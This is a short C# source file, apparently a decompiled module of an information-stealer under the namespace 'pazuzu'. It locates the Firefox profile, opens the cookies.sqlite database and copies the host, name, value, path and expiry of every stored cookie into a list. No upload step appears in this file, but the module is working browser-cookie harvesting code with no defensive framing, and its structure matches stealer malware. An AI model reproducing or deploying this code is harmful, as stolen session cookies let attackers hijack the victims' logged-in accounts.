using System.Collections.Generic;
using System.IO;
using pazuzu.Required;

namespace pazuzu.FireFox;

internal sealed class Cookies
{
	public static List<Common.Cookie> Get(string BrowserDir)
	{
		List<Common.Cookie> list = new List<Common.Cookie>();
		string profile = Profile.GetProfile(BrowserDir);
		if (profile == null)
		{
			return list;
		}
		string database = Path.Combine(profile, "cookies.sqlite");
		SQLiteHandler sQLiteHandler = SQLiteHandler.ReadTable(database, "moz_cookies");
		if (sQLiteHandler == null)
		{
			return list;
		}
		for (int i = 0; i < sQLiteHandler.GetRowCount(); i++)
		{
			Common.Cookie item = default(Common.Cookie);
			item.sHostKey = sQLiteHandler.GetValue(i, 4);
			item.sName = sQLiteHandler.GetValue(i, 2);
			item.sValue = sQLiteHandler.GetValue(i, 3);
			item.sPath = sQLiteHandler.GetValue(i, 5);
			item.sExpiresUtc = sQLiteHandler.GetValue(i, 6);
			list.Add(item);
		}
		return list;
	}
}
